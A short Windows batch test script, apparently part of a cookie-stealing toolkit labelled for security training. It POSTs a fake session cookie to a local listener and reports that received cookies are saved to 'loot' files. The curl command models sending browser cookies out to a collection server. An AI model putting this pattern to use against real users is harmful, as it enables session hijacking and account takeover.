@echo off
REM test_curl.bat - tests the HTTP listener (listen.py) with a fake cookie via curl
REM EDUCATIONAL USE ONLY - FOR SECURITY RESEARCH AND TRAINING
REM Usage: test_curl.bat [port]
REM   1. Open another terminal: python listen.py 9090
REM   2. Run this: test_curl.bat 9090

set PORT=%1
if "%PORT%"=="" set PORT=9090

echo [*] sending test cookie to http://127.0.0.1:%PORT%/ ...

curl -s -X POST http://127.0.0.1:%PORT%/ ^
  -H "Content-Type: application/json" ^
  -d "[{\"domain\":\".test.com\",\"name\":\"session\",\"value\":\"curl_test_123\",\"path\":\"/\",\"expirationDate\":0,\"sameSite\":\"Lax\",\"secure\":false,\"httpOnly\":false,\"hostOnly\":false,\"session\":true}]"

echo.
echo [*] if you see "ok" above, the listener is working.
echo [*] cookies saved to loot\cookies.json and loot\cookies.txt
